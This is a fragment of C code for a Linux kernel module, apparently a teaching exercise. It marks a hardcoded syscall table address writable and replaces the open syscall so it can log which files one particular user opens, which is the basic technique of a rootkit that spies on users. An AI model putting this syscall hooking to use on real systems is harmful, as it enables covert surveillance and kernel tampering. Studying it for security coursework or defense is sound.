...
void **sys_call_table_address = (void*)0xffffffff81801400;
...
asmlinkage int my_open(const char* file, int flags, int mode){
  unsigned int cur_id = (unsigned int)(get_current_user() -> uid.val);  
  if(cur_id == marks_uid)
    printk(KERN_INFO "mark is opening %s\n", file);
...
shady_init_module(void)
{
  ...
  set_addr_rw((unsigned long)sys_call_table_address);
